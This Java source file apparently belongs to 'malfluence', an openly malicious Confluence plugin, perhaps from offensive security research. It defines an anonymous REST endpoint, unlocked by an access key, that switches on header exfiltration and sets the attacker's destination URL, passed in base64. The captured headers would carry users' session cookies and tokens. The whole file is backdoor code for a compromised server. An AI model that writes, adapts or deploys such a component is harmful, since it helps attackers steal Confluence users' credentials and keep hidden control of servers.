package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Log;

import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.util.Base64;

// Sets the exfiltration URL where the headers will be sent to
// GET /maintenance/headerexfilconfig?accesskey=<Access Key>&url=<base64 encoded target URL>&enabled={TRUE,FALSE}
@Path("/headerexfilconfig")
public class HeaderExfilConfig {

    public static String ExfilURL = "http://127.0.0.1:9999";
    public static Boolean Enabled = false;

    @GET
    @AnonymousAllowed
    @Produces(MediaType.TEXT_PLAIN)
    public Response ConfigHeaderExfil(@QueryParam("accesskey") String accesskey, @QueryParam("url") String targetUrl_enc, @QueryParam("enabled") String isEnabled) {
        try {
            if (!Auth.IsValidKey(accesskey)) {
                return Response
                        .status(Response.Status.FORBIDDEN)
                        .build();
            }

            if (targetUrl_enc == null) {
                String message = "Invalid parameter url";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            if (isEnabled == null) {
                String message = "Invalid parameter enabled";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            if (isEnabled.equals("TRUE") ) {
                Enabled = true;
                Log.Debug("Enabling the header exfil");
            } else if (isEnabled.equals("FALSE")) {
                Enabled = false;
                Log.Debug("Disabling the header exfil");
            } else {
                String message = "Invalid parameter enabled";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            String url_dec = new String(Base64.getDecoder().decode(targetUrl_enc));
            Log.Debug(String.format("Setting the header exfil URL to '%s'", url_dec));
            ExfilURL = url_dec;

            return Response
                    .status(Response.Status.OK)
                    .build();

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
}
